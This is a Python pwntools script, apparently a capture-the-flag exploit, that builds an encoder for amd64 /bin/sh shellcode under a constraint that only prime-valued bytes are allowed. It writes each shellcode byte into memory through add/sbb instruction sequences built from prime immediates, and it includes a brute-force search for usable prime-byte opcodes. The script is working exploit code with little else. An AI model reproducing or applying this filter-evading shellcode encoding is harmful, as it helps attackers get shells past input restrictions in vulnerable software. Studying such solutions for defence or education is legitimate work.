
from pwn import *
context(arch = 'amd64', os = 'linux')

import sys
from itertools import *
from fractions import gcd
import binascii

prime_bytes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73,
79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163,
167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251]

prime_hex_bytes = [0x2,0x3,0x5,0x7,0xb,0xd,0x11,0x13,0x17,0x1d,0x1f,
0x25,0x29,0x2b,0x2f,0x35,0x3b,0x3d,0x43,0x47,0x49,0x4f,0x53,0x59,0x61,
0x65,0x67,0x6b,0x6d,0x71,0x7f,0x83,0x89,0x8b,0x95,0x97,0x9d,0xa3,0xa7,
0xad,0xb3,0xb5,0xbf,0xc1,0xc5,0xc7,0xd3,0xdf,0xe3,0xe5,0xe9,0xef,0xf1,0xfb]

prime_list = [ 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73,
79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163,
167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251]


p_shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())
p_payload = ''


def goldbach_conj(number):
	
	x, y = 0, 0
	for a in prime_list:
		for b in prime_list:
			if a+b == number:
				return a,b
	print str(number)
	print 'omgggg'
	sys.exit()

def is_prime(number):
    if number % 2:
        # equivalent to if number % 2 != 0 because if number is
        # divisible by 2 it will return 0, evaluating as 'False'.
        for num in range(3, int(math.sqrt(number)) + 1, 2):
            if number % num == 0:
               return False
        return True
    else:
        return False

def list_of_primes(number):
    prime_list = []
    for x in range(2, number + 1):
            if is_prime(x):
                prime_list.append(x)
    return prime_list


def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m







def print_good_opcode(s):
	if  False or \
		"(bad)" in s or \
		".byte" in s or \
		"sti" in s or \
		"icebp" in s or \
		"rex." in s or \
		"addr32" in s or \
		"gs" in s or \
		False:
		return
	else:
		print s

def print_opcodes():
	
	# hard coded, who cares, there is some clever way with itertools
	# x86 has a maximum of 15 bytes according to Intel
		
	for p in prime_bytes:
		dis = disasm(chr(p))
		print_good_opcode(dis)
	
	n = 2
	r,s,t,u,v,x = 3,3,3,3,3,3
	for p,q in product(prime_bytes,repeat=n):
		dis = disasm(chr(p)+chr(q))
		print_good_opcode(dis)
	
	for p,q in product(prime_bytes,repeat=n):
		dis = disasm(chr(p)+chr(q)+chr(r))
		print_good_opcode(dis)
	
	for p,q in product(prime_bytes,repeat=n):
		dis = disasm(chr(p)+chr(q)+chr(r)+chr(s))
		print_good_opcode(dis)
	
	for p,q in product(prime_bytes,repeat=n):
		dis = disasm(chr(p)+chr(q)+chr(r)+chr(s)+chr(t))
		print_good_opcode(dis)
	
	for p,q in product(prime_bytes,repeat=n):
		dis = disasm(chr(p)+chr(q)+chr(r)+chr(s)+chr(t)+chr(u))
		print_good_opcode(dis)
	
	for p,q in product(prime_bytes,repeat=n):
		dis = disasm(chr(p)+chr(q)+chr(r)+chr(s)+chr(t)+chr(u)+chr(v))
		print_good_opcode(dis)
	
	for p,q in product(prime_bytes,repeat=n):
		dis = disasm(chr(p)+chr(q)+chr(r)+chr(s)+chr(t)+chr(u)+chr(v)+chr(x))
		print_good_opcode(dis)
	
	#n+=1
	#for p,q,r,s,t,u,v,x in product(prime_bytes,repeat=n):
	#	dis = disasm(chr(p)+chr(q)+chr(r)+chr(s)+chr(t)+chr(u)+chr(v)+chr(x))
	#	print_good_opcode(dis)

# registers state before jumpTo
#
#
#

def craft_payload():
	global p_payload
	offset = 1337
	p_payload += '  \n'
	
	# supor al = 0
	k = 0
	for j in p_shellcode:
		k += 1
		i = ord(j)
		if i < 4: # only deals with 0x1
			p_payload += ' add  eax, 0x05050505 \n'
			p_payload += ' sbb  eax, 0x02020202 \n'
			p_payload += ' sbb  eax, 0x02020202 \n'
			p_payload += ' mov  DWORD PTR [rdi],eax \n'
			
			p_payload += ' mov  ecx,eax \n'
			p_payload += ' mov  eax,edi \n'
			p_payload += ' add  eax,0x05050503 \n'
			p_payload += ' sbb  eax,0x05050502 \n'
			p_payload += ' mov  edi,eax \n'
			p_payload += ' mov  eax,ecx \n'
			
			p_payload += ' add  eax, 0x05050505 \n'
			p_payload += ' sbb  eax, 0x02020203 \n'
			p_payload += ' sbb  eax, 0x02020203 \n'
			
		elif i == 255:
			p_payload += ' add  eax, 0x050505fb \n'
			p_payload += ' add  eax, 0x03030302 \n'
			p_payload += ' add  eax, 0x03030302 \n'
			p_payload += ' mov  DWORD PTR [rdi],eax \n'
			
			p_payload += ' mov  ecx,eax \n'
			p_payload += ' mov  eax,edi \n'
			p_payload += ' add  eax,0x05050503 \n'
			p_payload += ' sbb  eax,0x05050502 \n'
			p_payload += ' mov  edi,eax \n'
			p_payload += ' mov  eax,ecx \n'
			
			p_payload += ' sbb  eax, 0x050505fb \n'
			p_payload += ' sbb  eax, 0x02020202 \n'
			p_payload += ' sbb  eax, 0x02020202 \n'
			
		elif is_prime(i):
			p_payload += ' add  eax, 0x050505' + format(i, '02x') + ' \n'
			p_payload += ' mov  DWORD PTR [rdi],eax \n'
			
			p_payload += ' mov  ecx,eax \n'
			p_payload += ' mov  eax,edi \n'
			p_payload += ' add  eax,0x05050503 \n'
			p_payload += ' sbb  eax,0x05050502 \n'
			p_payload += ' mov  edi,eax \n'
			p_payload += ' mov  eax,ecx \n'
			
			p_payload += ' sbb eax, 0x050505' + format(i, '02x') + ' \n'
		
		else:
			a, b = goldbach_conj(i)
			print hex(i), " ,", hex(a+b)
			# queremos que al = shellcode[i]
			p_payload += ' add  eax, 0x050505' + format(a, '02x') + ' \n'
			p_payload += ' add  eax, 0x030303' + format(b, '02x') + ' \n'
			p_payload += ' mov  DWORD PTR [rdi],eax \n'
			
			p_payload += ' mov  ecx,eax \n'
			p_payload += ' mov  eax,edi \n'
			p_payload += ' add  eax,0x05050503 \n'
			p_payload += ' sbb  eax,0x05050502 \n'
			p_payload += ' mov  edi,eax \n'
			p_payload += ' mov  eax,ecx \n'
			
			p_payload += ' sbb  eax, 0x050505' + format(a, '02x') + ' \n'
			p_payload += ' sbb  eax, 0x030303' + format(b, '02x') + ' \n'
	
	#print p_payload
	compiled = asm(p_payload)
	print binascii.hexlify(compiled)
	print str(len(compiled)/2)

def main():
	#print ",".join([hex(p) for p in prime_bytes])
	#print_opcodes()
	craft_payload()

	
main()

